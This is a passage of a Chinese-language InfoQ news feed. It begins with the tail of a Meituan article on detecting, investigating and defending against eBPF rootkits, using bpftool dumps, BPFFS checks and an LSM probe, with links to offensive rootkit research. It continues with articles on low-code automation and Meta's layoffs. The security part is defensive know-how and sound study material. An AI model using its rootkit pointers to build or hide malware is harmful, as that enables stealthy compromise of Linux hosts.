hook点。</p><p></p><p>CGROUP的的BPF_PROG_TYPE_CGROUP_SKB、BPF_PROG_TYPE_CGROUP_SOCK类型程序的加载情况都可以通过bpftool prog show查看。长短生命周期的BPF程序区别是缺少用户空间进程PID信息。如下图所示：</p><p><img src=\"https://static001.geekbang.org/infoq/f7/f7ed8d8e3e810cadab3e8e78fb093b0e.jpeg\" /></p><p></p><p>BPFFS</p><p></p><p>除了前面提到的方法外，BPF文件系统BPFFS也是让BPF程序后台运行的方式。用户空间进程可以使用任意名字将BPF程序PIN到BPFFS。让在BPFFS来自动增加BPF对象的refcnt引用计数器，来保持后台的活跃状态。在使用时，只需要使用bpf_obj_get(“BPFFS path”)就可以获得BPF对象的FD。</p><p></p><p>BPFFS在Linux的类型是BPF_FS_MAGIC，默认目录/sys/fs/bpf/，可自定义修改，但确保文件系统类型是unix.BPF_FS_MAGIC。</p><p></p><p>在检测思路上，我们需要关注虚拟文件系统是不是unix.BPF_FS_MAGIC类型。</p><p></p><p>在Linux系统上，mount -t bpf来查看系统所有挂在的文件类型，是否包含BPFFS类型。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/ac/aca85193ebd8cf4025151bcf6be04bd4.jpeg\" /></p><p></p><p>确定BPFFS的目录后，我们再查看目录下的挂载点是否存在异常。</p><p></p><h4>取证</h4><p></p><p></p><p>内核已加载的BPF对象导出</p><p></p><p>bpftool工具可以导出有FD ID的PROG、MAP。&nbsp;BPF PROG程序&nbsp;可以导出opcode\\visual\\linum等多种格式，并可以生成调用关系图。具体可以查看bpftool的帮助文件。</p><p><code lang=\"null\">root@vmubuntu:/home/cfc4n# bpftool prog help\nbpftool prog dump xlated PROG [{ file FILE | opcodes | visual | linum }]\nbpftool prog dump jited  PROG [{ file FILE | opcodes | linum }]</code></p><p></p><p>BPF MAP&nbsp;与PROG类似，也可以通过bpftool导出内容，并支持json格式化内容。</p><p><code lang=\"null\"> root@vmubuntu:/home/cfc4n# bpftool map dump id 20\n[{\n        \"value\": {\n            \".rodata\": [{\n                    \"target_ppid\": 0\n                },{\n                    \"uid\": 0\n                },{\n                    \"payload_len\": 38\n    ...</code></p><p></p><p><img src=\"https://static001.geekbang.org/infoq/46/46775b4b4fc918ceb98a5cc131f60287.jpeg\" /></p><p></p><p>BPFFS类型的BPF对象，虽然可以更便捷的放到后台执行，用户空间程序可以退出，也可以再次读取，但这也给取证带来很大便利。bpftool命令也支持从pinned到BPFFS文件系统的路径里导出prog、map。参数稍有区别，详情见bpftool help。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/a3/a36348f41443f5fcf9a9a5b48b45f534.jpeg\" /></p><p></p><p>内核未加载的BPF对象</p><p></p><p>当定位到后门rootkit的用户空间程序后，那么BPF字节码肯定会被其调用。字节码内容一般会放在一个独立文件中，或者作为字节码编译到当前程序里。这也只需要使用IDA之类反编译工具，定位到相关字节流，导出即可。</p><p></p><p>以本文演示视频中的ehids进程为例，使用<a href=\"https://github.com/ehids/ebpfmanager\">GitHub/ehids/ebpfmanager</a>\"&nbsp;纯Go的eBPF模块管理器package，对于eBPF字节码会使用github.com/shuLhan/go-bindata/cmd/go-bindata包对BPF字节码进行加载、Gzip压缩，作为Go代码的变量，在部署时比较边界。</p><p></p><p>IDA Pro加载时，我们可以在.noptrdata段部分看到这块代码，开始地址是0000000000827AE0，导出后再解压，可以还原原来的BPF ELF文件内容。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/c6/c629686b7c47d266e4ca6c7ef59d709d.jpeg\" /></p><p></p><p>因为每个BPF用户态实现不同，类库也不一样，静态分析实践起来有难度。那可以模拟相同环境，动态运行，提前hook BPF syscall，找到FD设置的地方，也是可以导出BPF的ELF文件。</p><p></p><p>字节码分析</p><p></p><p>BPF字节码本身也是ELF格式，只是格式指令上有一定区别。反编译工具IDA pro也能支持，国外安全工程师开源了一个Python插件：<a href=\"https://github.com/cylance/eBPF_processor\">eBPF IDA Proc</a>\"&nbsp;，并整理了一篇分析的文章：<a href=\"https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool\">Reverse Engineering Ebpfkit Rootkit With BlackBerry's Enhanced IDA Processor Tool</a>\"&nbsp;，感兴趣的同学可以读读。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/7f/7ff805af0d6076c9049a4f06fdcfc393.png\" /></p><p></p><h3>如何防御&nbsp;</h3><p></p><p></p><p>eBPF在网络安全场景的使用，除了做入侵检测外，还可以用于防御。LSM PROBE hook提供了相关功能。以容器逃逸场景为例，行为最明显的特征是“父子进程”的Namespace不一致，子进程创建完成后，判断这个特征是否匹配，返回EPERM覆盖进程创建函数的返回值，从而起到防御的目的。相比内核模块等防御实现，eBPF实现更加安全、稳定、可靠，从而在源头上解决容器逃逸的问题。</p><p></p><p>同样，本文认为eBPF也是二进制层最优秀的虚拟补丁、热更新解决方案。</p><p><img src=\"https://static001.geekbang.org/infoq/4a/4ab1293bf2884c338adc65bb8f4d9865.png\" /></p><p></p><p><code lang=\"null\">LSM_PROBE(bpf, int cmd, union bpf_attr *attr, unsigned int size)\n{\n    return -EPERM;\n}</code></p><p></p><p>在系统的配置上有一定要求，CONFIG_BPF_LSM=y、CONFIG_LSM等配置内容，必须包含bpf等，详情可参考<a href=\"https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#11-lsm-probes\">BCC类库Demo lsm probe</a>\"&nbsp;。</p><p></p><h2>工程实现</h2><p></p><p></p><h3>练手</h3><p></p><p></p><p>入门练手，可以尝试使用BCC的类库：<a href=\"https://github.com/iovisor/bcc\">GitHub/BCC</a>\"&nbsp;，以及C语言用户空间程序的各种Demo例子<a href=\"https://github.com/libbpf/libbpf-bootstrap\">Demo BPF applications</a>\"&nbsp;。</p><p></p><h3>类库选择</h3><p></p><p></p><p>工程化时，对项目质量、稳定性、研发效率等都有要求，推荐Cilium的纯Go eBPF类库，由Cilium官方背书可放心使用。Datadog公司的Agent产品也是用这个类库。</p><p></p><p>本文的产品也是参考Datadog，抽象包装了Cilium的eBPF库，实现配置化便捷管理eBPF程序。GitHub仓库：<a href=\"https://github.com/ehids/ebpfmanager\">ehids/ebpfmanager</a>\"&nbsp;，欢迎大家使用。</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/4d/4dbbda4c8b8566893600f1e98071319f.png\" /></p><p></p><p>当然，也可以使用libbpf包装的go类库实现，比如tracee等产品。</p><p></p><h3>系统兼容性 CO-RE</h3><p></p><p></p><p>eBPF的出现极大地简化了编写内核态代码的门槛，极高的安全性，友好的加载方式，高效的数据交互，令eBPF深受追捧。然而和编写传统内核模块相同，内核态的功能开发伴随着繁冗的适配测试工作，Linux繁多的内核版本更是让适配这件事难度陡增，这也就是BTF出现之前的很长一段时间里，bcc + clang + llvm被人们诟病的地方。程序在运行的时候，才进行编译，目标机器还得安装clang llvm kernel-header等编译环境，同时编译也会消耗大量CPU资源，这在某些高负载机器上是不能被接受的。</p><p></p><p>因此，BTF&amp;CO-RE横空出现，BTF可以理解为一种Debug符号描述方式，此前传统方式Debug信息会非常巨大，Linux内核一般会关闭Debug符号，BTF的出现解决了这一问题，大幅度减少Debug信息的大小，使得生产场景内核携带Debug信息成为可能。</p><p></p><p>可喜的是，通过运用BTF&amp;CO-RE这项技术，可以帮助开发者节省大量适配精力，但是这项技术目前还是在开发中，还有许多处理不了的场景，比如结构体成员被迁入子结构体中，这时候还是需要手动解决问题，BTF的开发者也写了一篇文章，讲解不同场景的处理方案<a href=\"https://nakryiko.com/posts/bpf-core-reference-guide/\">bpf-core-reference-guide</a>\"。</p><p></p><h3>大型项目</h3><p></p><p></p><p>在国外，云原生领域产品发展较快，涌现出一批批基于eBPF的产品，包括Cilium、<a href=\"https://www.cnxct.com/how-does-datadog-use-ebpf-in-runtime-security/\">Datadog</a>\"&nbsp;、Falco、Katran等，应用在网络编排、网络防火墙、跟踪定位、运行时安全等各个领域，可以借鉴这些大型项目的研发经验，来加快产品建设，包括多系统兼容、框架设计、项目质量、监控体系建设等。本篇以检测防御为主，工程建设相关经验，我们将在以后的文章中分享。</p><p></p><h2>总结&nbsp;&nbsp;</h2><p></p><p></p><p>随着云原生快速发展，eBPF实现软件、运行环境会越来越多。而eBPF的恶意利用也会越来越普遍。从国内外的情况来看，国外对这个方向的研究远比国内超前，我们再次呼吁大家，网络安全产品应当尽快具备eBPF相关威胁检测能力。</p><p></p><p>本文跟大家探讨了基于eBPF技术的恶意利用与检测机制，其中提到的eBPF在防御检测产品研发、工程建设等内容，我们将在下一篇跟大家分享，敬请期待。</p><p></p><p>作者简介</p><p></p><p>陈驰、杨一、鑫博，均来自美团信息安全部。</p><p></p><p>参考文献：</p><p></p><p><a href=\"https://www.youtube.com/watch?v=g6SKWT7sROQ\">Creating and Countering the Next Generation of Linux Rootkits</a>\"<a href=\"https://www.youtube.com/watch?v=5zixNDolLrg\">DEFCON 29 - eBPF, I thought we were friends</a>\"<a href=\"https://github.com/ehids/slide\">eBPF的各种技术应用PDF集合</a>\"<a href=\"https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/\">Offensive BPF: Malicious bpftrace</a>\"<a href=\"https://blog.tofile.dev/2021/08/01/bad-bpf.html\">Bad BPF - Warping reality using eBPF</a>\"<a href=\"https://facebookmicrosites.github.io/bpf/blog/2018/08/31/object-lifetime.html\">Lifetime of BPF objects</a>\"<a href=\"https://arthurchiao.art/blog/bpf-advanced-notes-1-zh\">BPF程序（BPF Prog）类型详解：使用场景、函数签名、执行位置及程序示例</a>\"<a href=\"https://qmonnet.github.io/whirl-offload/2021/09/23/bpftool-features-thread/\">Features of bpftool: the thread of tips and examples to work with eBPF objects</a>\"<a href=\"https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool\">Reverse Engineering Ebpfkit Rootkit With BlackBerry's Enhanced IDA Processor Tool</a>\"<a href=\"https://image.cnxct.com/2021/12/path-defcon29-ebpf.pdf\">Creating and countering the next generation of Linux rootkits using eBPF</a>\"<a href=\"https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html\">eBPF Syscall</a>\"<a href=\"https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/?=xawxgzh\">Cilium eBPF实现机制源码分析</a>\"<a href=\"https://github.com/Gui774ume/ebpfkit\">ebpfkit is a rootkit powered by eBPF</a>\"</p>",
    "publish_time": "2023-03-16 06:00:00",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "当你的技术栈不能满足每个人需求时，下一步是什么呢？",
    "url": "https://www.infoq.cn/article/7Ps0qyHfQhp59g7YrEvZ",
    "summary": "<p>无论技术发展得有多快，对于一些企业来说，他们往往会感到落后一步。在一个又一个部门，从人力资源和采购到财务和营销，都存在关键软件解决方案不能完全满足其组织需求的情况。对于员工、部门经理，当然还有IT部门来说，这都是一个问题。</p><p>&nbsp;</p><p>对业务敏捷性的贪得无厌，给IT组织选择、集成和部署适当且完整的企业平台带来了巨大压力。然而，通常情况下，技术栈可以做什么和它应该做什么之间是存在差距的。</p><p>&nbsp;</p><p>近十年来推动大多数IT活动的数字转型实际上扩大了部门技术栈的差距。数字化转型通常侧重于大规模实施；它可能会遗漏一些不太可见但却必不可少的工作流和流程，这些工作流和流程将主要平台紧密拼接在了一起。近年来，合格开发人员的短缺更是加剧了这种情况，这使得实现连接良好的解决方案变得更加困难。</p><p>&nbsp;</p><p>因此，业务团队经常使用未完全形成、未被充分解释或不适合当前工作需求的技术。无奈之下，他们使用手动流程或临时软件创建自己的解决方案。</p><p>&nbsp;</p><p>未经批准的影子IT解决方案可能会产生晦涩难懂的过程、不一致的工作流程并缺乏可见性，更不用说安全性和可扩展性问题了。</p><p>&nbsp;</p><p>当公司跟不上变革的步伐时，它们就会失去市场领导者的地位。随着僵化的系统变得过于笨重且修改昂贵，价值转换速度就会下降。混乱的技术环境取代了本应平稳、规范的自动化。</p><p>&nbsp;</p><p></p><h2>可扩展性的挑战</h2><p></p><p></p><p>技术栈可扩展性——可灵活扩展现有技术解决方案的能力——是设计良好的IT生态系统的基本特征。然而，创造这一重要优势并不容易。</p><p>&nbsp;</p><p>垂直解决方案能解决具体的问题，但很僵化；另一方面，水平解决方案虽然更灵活，但修改成本很高。此外，当开发人员忙于企业的其他工作时，定制遗留组件可能是一项挑战。</p><p>&nbsp;</p><p>确实存在其他替代方案。许多组织在应用程序生态系统中购买额外的模块，希望它们能够解决其独特的问题。机器人流程自动化（RPA）是一种选择，虽然可以有效满足特定需求，但需要业务团队自己进行连接，并且仍然会使技术栈变得复杂且缺乏控制。</p><p>&nbsp;</p><p></p><h2>控制结果</h2><p></p><p></p><p>另一方面，低代码BPA（Business Process Automation，业务流程自动化）的优势使其处于技术栈可扩展性方法的最前沿。低代码通过为业务团队提供一套易于使用、易于理解且最重要的是经过IT认可的工具来提高流程弹性。使用这些构建块，最终用户可以用补充和协调现有组件的解决方案方式来缩小差距，而不是与它们竞争或复杂化它们。</p><p>&nbsp;</p><p>低代码方法带来了许多IT优势。它使业务团队能够自己完成大部分工作，从而节省了开发人员的资源并减少了工作积压。它标准化了流程，从而更容易执行安全授权。由于可扩展性内置于低代码框架中，因此补充编码是最少的。</p><p>&nbsp;</p><p>最终用户希望拥有经过IT认可的功能，这些功能使他们能够快速做出更改。他们无需等待定制的解决方案，而是能够随着业务需求的发展进行调整。工作流程变得更相关、更方便、更高效。</p><p>&nbsp;</p><p></p><h2>尝试与测试</h2><p></p><p></p><p>领先的企业已经体验到了低代码支持技术栈可扩展性的优势。全球箱包制造商新秀丽（Samsonite）一直在努力解决其采购工作流程中的几个漏洞。请求是通过电子邮件和文件共享来执行的，部门工作人员必须筛选旧消息，以找到向供应商发起采购报价所需的信息。</p><p>&nbsp;</p><p>低代码BPA解决了这些问题。在对采购流程进行了分析，使其标准化，并确保其符合内部政策和外部法律、财务和税务要求后，新秀丽的采购团队开始创建了每个阶段都必需审批的工作流程。技术栈可扩展性解决方案简化了请求/履约流程，使购买者和请求者能够接收自动通知和警报。</p><p>&nbsp;</p><p>在最初的五个月内，新秀丽减少了大约2370个小时的手工工作，并实现177%的整体投资回报率。</p><p>&nbsp;</p><p></p><blockquote>新秀丽的客户服务和采购经理Mauricio Rizzi表示：“我们的新系统不仅为我们提供了所需的控制，以确保每个人都要遵守我们的规则和政策，而且还为未来的审计创建了一条易于访问的追踪。”</blockquote><p></p><p>&nbsp;</p><p>另一个例子是总部位于伦敦的领先工业车辆制造商CNH。CNH正在处理一个由15个不同系统组成的技术栈，这些系统是在其数字化转型过程中必须实施的。这些系统之间缺乏集成，阻碍了公司人事运营部门的效率，迫使员工通过电子邮件或纸张手动输入、存储和交流信息。</p><p>&nbsp;</p><p>在采用低代码BPA后，人事运营团队能够构建和支持许多改进的流程和体验。与以前更传统的方法相比，该系统赋予了他们更多的所有权和灵活性。</p><p>&nbsp;</p><p></p><blockquote>CNH的服务设计师Diogo Ayres表示：“现在我可以教我们人事运营组织中的任何人如何使用我们的低代码解决方案，他们几乎可以将其用于任何流程。”。“它让我们能够为员工和应聘者提供无缝且一致的体验。”</blockquote><p></p><p>&nbsp;</p><p></p><h2>如何让无代码/低代码为你工作</h2><p></p><p></p><p>公民开发（Citizen development）——当非技术用户能够使用无代码或低代码解决方案来创建新的应用程序而无需编写一行代码时——是提高团队日常效率或简化现有业务流程的有效方式。公民开发人员是优化和扩展组织运营不可或缺的一部分。然而，培养IT团队和公民开发人员之间的共生关系是确保成功并优先考虑高质量产出的关键。</p><p>&nbsp;</p><p>IT需要在整个过程中与公民开发人员合作，以确保最大限度的安全和效率。从一开始，确认团队的整体方法、选择正确的工具、确立角色、设定目标以及讨论公民开发人员何时应向IT部门寻求支持都是非常重要的。为公民开发人员计划指定一名领导是帮助执行这些政策并使团队对达成商定的里程碑负责的一种好方法。</p><p>&nbsp;</p><p>为了鼓励协作并使公民自动化成为日常实践，重要的是必须持续工作，以确定可以自动化的业务流程中的痛点和手动工作。IT部门应定期与业务部门、财务部门和人力资源部门进行沟通，以寻找实现自动化的机会，明确计划出受影响的人会看到什么样的变化。获得其他团队领导的支持是至关重要的，因此公民开发人员和IT部门需要成为自动化优势的内部倡导者。</p><p>&nbsp;</p><p>另一个不可协商的基本规则是，公民开发人员应该只能使用经IT认可的工具平台。这为IT部门提供了监控新应用程序质量和安全性所需的洞察力和能力。IT部门还可以设置“沙箱环境”来降低风险，并允许开发人员在不干扰其他系统的情况下创建应用程序。最终，IT部门负责监控所有公民开发人员的活动和应用程序开发。</p><p>&nbsp;</p><p>为了帮助无代码/低代码解决方案与现有IT基础架构顺利集成，公司应该：</p><p>&nbsp;</p><p>寻找具有支持安全性和合规性工作的功能软件，如SSO、MFA和权限管理。比较软件的正常运行时间和可用性，以最大限度地降低中断风险。确保软件供应商提供了适当的支持，这样IT团队就不会承担不必要的维护工作。在节省IT资源方面，无代码/低代码软件可以帮助公民开发人员并邀请企业用户参与解决问题的过程，这也有助于减少IT的工作积压。最后但同样重要的是，考虑可以跨多个部门处理多个用例的无代码/低代码解决方案。可扩展性和技术栈可扩展性是成本控制策略，当解决方案易于适应并与广泛的应用程序和系统集成时，可提供最大的价值。</p><p>&nbsp;</p><p>投资于正确的无代码/低代码解决方案是第一步，但投资于内部培训和技能开发更为重要。公司需要向公民开发人员提供适当的教育、支持和学习资源。增长并非一蹴而就；IT需要以耐心和团队精神来处理公民发展问题。创建协作学习环境也有助于降低公民开发人员追求影子IT解决方案或犯代价高昂的错误的风险。</p><p>&nbsp;</p><p>公民发展的目的是增强非技术员工的能力，而不是消除IT。虽然公民发展听起来像是对IT部门的威胁，但实际上恰恰相反。公民发展旨在帮助IT专业人员。虽然开始时可能需要一些时间，但当公民开发人员能够自行构建和连接高质量的自动化工作流时，这笔投资就会得到回报。</p><p>&nbsp;</p><p></p><h2>未来预测</h2><p></p><p></p><p>技术栈可扩展性，特别是在低代码BPA启用时，显著提高了典型企业的敏捷性和竞争力。关键应用程序仍然保持相关，实用程序得到了提升，无需定制开发，也无需深入组织的核心（通常是最昂贵的）技术投资。</p><p>&nbsp;</p><p>在这种渐进的方法下，业务用户成为了IT的合作伙伴，遵循相同的策略。开发人员资源总是非常宝贵的，因此得到保护和扩展。利益相关者能够更快地行动，因此每个人的生活都变得更加轻松。</p><p>&nbsp;</p><p>也许永远不会有技术能够充分预测商业需求的时候；然而，灵活、安全和易于使用的连接解决方案可以极大地减少动态环境中的麻烦，并使企业能够满怀信心地向前发展。通过技术栈可扩展性，IT不再需要预测未来。相反，它可以简单地为未来计划。</p><p>&nbsp;</p><p></p><h2>作者介绍</h2><p></p><p></p><p><a href=\"https://www.linkedin.com/in/alessioalionco/\">Alessio Alionço</a>\"是业务流程自动化解决方案Pipify的创始人兼首席执行官。作为一名资深的商业顾问和企业家，Alionço拥有精益六西格玛黑带，并持有斯坦福大学商学院的LEAD证书：个人领导力课程证书。</p><p>&nbsp;</p><p>&nbsp;</p><p>原文链接：</p><p><a href=\"https://www.infoq.com/articles/tech-stack-not-meeting-needs/\">https://www.infoq.com/articles/tech-stack-not-meeting-needs/</a>\"</p><p></p><p>相关阅读：</p><p><a href=\"https://www.infoq.cn/article/g6D7e4ki76V3dRBWkrrK\">基于契约的开发：通过明确需求优化软件开发流程</a>\"</p><p><a href=\"https://www.infoq.cn/article/jpSYVMHY71wO6wchb71x\">架构师角色的演变：从发号施令到与团队合作</a>\"</p>",
    "publish_time": "2023-03-16 08:00:00",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "Meta再裁10000人！先裁技术岗，对华人员工影响大，扎克伯格写“小作文”拿扁平化当裁员借口",
    "url": "https://www.infoq.cn/article/DISIpqNzOaslaKw0RooO",
    "summary": "<p>当地时间3月14日，Meta正式宣布公司计划在未来几个月内裁员1万人，并关闭约5000个尚未聘用的空缺职位。</p><p>&nbsp;</p><p>此次裁员，已经是继去年11月份<a href=\"https://www.infoq.cn/article/UyvCmtFSRD989PZVlKXb\">裁掉1.1万多名员工</a>\"之后的第二轮裁员了，这意味着，在过去的6个月里，Meta共裁掉了2万多人。</p><p>&nbsp;</p><p><a href=\"https://www.infoq.cn/article/HV3jCMXQZEdCZUNgeevH\">Meta CEO扎克伯格</a>\"表示，Meta这次裁员计划主要是针对，“削减那些没有表现或可能不再重要的项目”，同时“裁减中层管理人员，以更快地做出决策”。</p><p>&nbsp;</p><p>在一封发给员工的电子邮件中（这封邮件也发送给了美国证券交易委员会），扎克伯格表示，2023年是Meta的“效率年”，其目标是“在困难的环境中改善我们的财务业绩”和“让我们成为更好的科技公司”。“总的来说，我们希望将我们的团队规模减少约 1万 人，并关闭约 5000 个我们尚未聘用的空缺职位，”他写道。</p><p>&nbsp;</p><p><img src=\"https://static001.geekbang.org/infoq/b3/b32f293066f472f137cd74ddea667b37.jpeg\" /></p><p></p><p>裁员信部分截图</p><p>&nbsp;</p><p>这篇“小作文”洋洋洒洒，看得让一些人直犯懵，有人在Reddit上问道，“裁员还需要写篇小说的吗？”还有人回复说，这篇小说不是写给员工看的，是写给投资者看的。</p><p>&nbsp;</p><p>周二，Meta股价高开高走，当天上涨5%，从此结果来看，这话确实有些道理。</p><p></p><h2>万人裁员时间线</h2><p></p><p>&nbsp;</p><p>在周二公开的裁员信里，扎克伯格说道，“在接下来几个月，公司高层将会重组，<a href=\"https://www.infoq.cn/article/1cIAgrMh4AYKuaVgSxq7\">采用扁平化管理</a>\"，同时将取消部分优先程度较低的项目，并且缩减招聘团队。”此次裁员将波及管理层、项目团队、招聘团队等多条业务线。</p><p>&nbsp;</p><p>值得注意的是，在去年的巅峰时期，Meta 拥有 87000 名全职员工。随后裁员了 1.1万人，现在又裁员了1万人。在经历了一段时间的大规模招聘之后，这比裁员开始前下降了 25%。</p><p>&nbsp;</p><p>扎克伯格说，<a href=\"https://www.infoq.cn/article/673lWz81ClJ4wK0DygAg\">Meta 去年增长速度大大放缓</a>\"，因此需要在经济下行的大背景下，缩减公司的运营成本，提高公司财务业绩。去年，Meta 报告收入为 1167 亿美元，同比下降 1%，营业利润下降 38% 至 289.4 亿美元。与之前的财年有显着差异。</p><p>&nbsp;</p><p>此外，在另一份提交给美国证券交易委员会的文件中，Meta 表示，预计其 2023 年全年支出将在860亿美元至920亿美元之间，这一数字低于此前估计的约950亿美元。这在很大程度上归因于与重组相关的“成本削减措施”，包括遣散费。</p><p>&nbsp;</p><p>为了减轻裁员带来的焦虑，扎克表示，他将“在今年尽快”做出改变，减少一些低绩效人员后，让大家“专注于未来的关键工作”。扎克伯格还指出了一些早期的内部分析，这些分析表明最初以现场办公形式加入Meta的<a href=\"https://www.infoq.cn/article/vZjvNVrlVS6paR9y8Ec8\">工程师</a>\"比远程加入到公司的工程师表现更好，这可能是对远程工作采取强硬立场的早期迹象。</p><p>&nbsp;</p><p>扎克伯格提到听取第一轮裁员员工的反馈，他将裁员透明化，选择了公开“裁员计划”，同时给出了今年较为清晰的裁员时间线：该公司预计将于4月底宣布技术部门的重组和裁员（工程师、数据科学家等技术岗位），5月底宣布业务部门的重组和裁员（HR、Marketing等非技术岗位）裁员)。“在少数情况下，我们可能需要到今年年底才能完成该计划。国际业务团队的时间表可能会有所差异。”他补充道。</p><p>&nbsp;</p><p>“这将是艰难的，但我们别无选择，”这位首席执行官说，他的个人财富为 644 亿美元。“这将意味着需要与一些曾为我们做出过贡献的、才华横溢的同事说再见。”</p><p></p><h2>“扁平化”只是裁员的说辞？</h2><p></p><p>&nbsp;</p><p>裁员如何帮助建立更好的公司？扎克伯格说，其中一个重大举措是让组织更扁平化。更扁平的组织结构图有助于去除中间管理层，因此，Meta 也会要求管理者成为“个人贡献者”。</p><p>&nbsp;</p><p>“众所周知，层次结构的每一层都会增加信息流的延迟，并规避掉一些决策制定中的风险。”</p><p>&nbsp;</p><p>扎克伯格还认为层级“越精简越好”。在去年 11 月裁掉 13% 的员工后，“一个令人惊讶的结果是许多事情进展得更快。回想起来，我低估了优先级较低的项目的间接成本。”</p><p>&nbsp;</p><p>他补充道：“一个更精简的组织将更快地执行优先高的事项。人们将更有效率，他们的工作将更加有趣和充实。我们也能吸引到最有才华的人。这就是为什么在我们的效率年，我们将专注于取消重复或优先级较低的项目。”</p><p>&nbsp;</p><p>然而事实上，据知情人士向外媒透露，Meta即将到来的新一轮裁员是由财务目标推动的，与公司“扁平化”没有直接关系。知情人士说，Meta已经看到广告收入放缓，并将重点转移到元宇宙平台，公司高层一直在要求董事和副总裁列出可以解雇的员工名单。</p><p>&nbsp;</p><p>据知情人士透露，这一阶段的裁员最快可能会在本周完成。一位知情人士说，那些正在制定裁员计划的人希望在首席执行官扎克伯格为他的第三个孩子休育儿假之前准备好，因此这次裁员的速度可能会非常快。</p><p>&nbsp;</p><p>知情人士说，扎克伯格将2023年Meta称为“效率年”，该公司一直在上周完成的绩效评估中向员工传达这一主题。</p><p>&nbsp;</p><p>上个月，在最近结束的一轮绩效评估中，Meta给了数千名员工低于标准的评级，这表明可能会有更多裁员。知情人士说，该公司还削减了一项奖金指标，这是在首席执行官扎克伯格宣布2023年将是“效率年”后，高管们正在采取的几项措施之一。</p><p>&nbsp;</p><p>Meta这波裁员对华人其实影响很大，公司将会暂停对外籍员工PERM劳工证的申请——公司不再为外籍员工申请绿卡。</p><p>&nbsp;</p><p></p><h2>高层判断失误，最终还是员工买单</h2><p></p><p>&nbsp;</p><p>Meta的第二轮裁员跟第一轮间隔不到半年，并且还会持续数月，而裁员最糟糕的事情是千刀万剐，人们一点一点地被解雇，让每个人都时刻担心下一个被裁掉的是自己。这将极大地打击士气，并且可能只会导致重要的员工（可能仍然非常需要）将目光投向别的企业。</p><p>&nbsp;</p><p></p><p><img src=\"https://static001.geekbang.org/infoq/2d/2de31621c7cf927982d5a09fc850bfc4.jpeg\" /></p><p></p><p>&nbsp;技术作家Gergely Orosz说，扎克伯格的这次裁员，让很多工程师都感到很沮丧，“裁员应该一次做到位，而且需要快速，Meta 不知何故未能做到这一点。而这第二次裁员时间线拉得很长，很难看出领导层的士气和信心如何不被摧毁。真的出了点问题……”</p><p>&nbsp;</p><p>还有一位工程师表达了他的挫败感：“我在 9 月份离开了一家金融科技公司，加入了 Meta。我以为金融科技公司的财务状况很糟糕，肯定会裁员。然后，那家金融科技公司确实也随后裁员了 10%。但是，Meta正在盈利，却也开始裁员，还达到了25%的程度，这简直让人难以接受！”</p><p>&nbsp;</p><p>上一次裁员，扎克伯格承认自己的判断出错了，“我要对此负责。”但无论如何，半年后的这次裁员，他明显还是选择了让底层员工来承担管理层犯下的错。</p><p>&nbsp;</p><p>2022年，美国科技行业出现“<a href=\"https://www.infoq.cn/article/4i3YZ65Eedg0h9218Whl\">裁员潮</a>\"”。</p><p>&nbsp;</p><p>追踪科技公司裁员情况的Layoffs.fyi网站数据显示，全球1050家科技公司2022年累计裁员超过16万人。Meta于当年11月宣布裁员1.1万人，约占其员工总数的13%。</p><p>&nbsp;</p><p>进入2023年，科技行业的裁员幅度进一步增大，全球483家科技公司的累计裁员人数已超12.8万。其中，亚马逊于1月4日宣布裁员超过1.8万人，微软于1月18日宣布裁员1万人。1月20日，谷歌母公司Alphabet宣布裁员1.2万人。</p><p>&nbsp;</p><p>业内人士分析指出，除了美国总体经济形势“降温”以及高管决策失误等内、外部原因之外，该国科技行业出现“裁员潮”的一个重要原因是新冠疫情期间各大企业的过度招聘。数据显示，Meta员工人数从2020年3月的4.8万多人飙升至2022年9月的8.7万多人。</p><p>&nbsp;</p><p>Meta 的裁员只是大型科技公司裁员潮的一部分。最近几个月，亚马逊、谷歌、微软、Salesforce 和其他公司也表示他们正在裁员，一些公司在最初宣布裁员后增加了裁员人数。许多公司的裁员说辞基本一致——他们都把裁员的“锅”甩给了增长疲软的全球经济环境。</p><p>&nbsp;</p><p>但即使在宏观经济条件之外，Meta 也面临着许多挑战。它不仅要应对数字广告放缓，还要应对苹果对其移动操作系统的隐私变更，这限制了 Meta 收集 iPhone 用户数据以帮助定位广告的能力。此外，它还面临来自 TikTok 的激烈竞争，<a href=\"https://www.infoq.cn/article/5DtYU4L0UlZ2fwdYhEcC\">TikTok</a>\" 在过去几年中人气飙升，也让Meta的处境雪上加霜。</p><p>&nbsp;</p><p>参考链接：</p><p></p><p><a href=\"https://www.cnbc.com/2023/03/14/meta-layoffs-10000-more-workers-to-be-cut-in-restructuring.html\">https://www.cnbc.com/2023/03/14/meta-layoffs-10000-more-workers-to-be-cut-in-restructuring.html</a>\"</p><p><a href=\"https://www.nytimes.com/2023/03/14/technology/meta-facebook-layoffs.html\">https://www.nytimes.com/2023/03/14/technology/meta-facebook-layoffs.html</a>\"</p><p>&nbsp;</p><p>&nbsp;</p>",
    "publish_time": "2023-03-16 15:39:01",
    "source": {
      "name": "infoq_recommend",
      "desc": "InfoQ推荐",
      "icon": "https://raw.githubusercontent.com/maguowei/today/master/imgs/icon/infoq.png"
    }
  },
  {
    "title": "商汤发布多模态多任务通用大模型：30亿参数，现已开源",
    "url": "https://www.infoq.cn/article/gPTLxkWM33sWzvv8Ts3O",
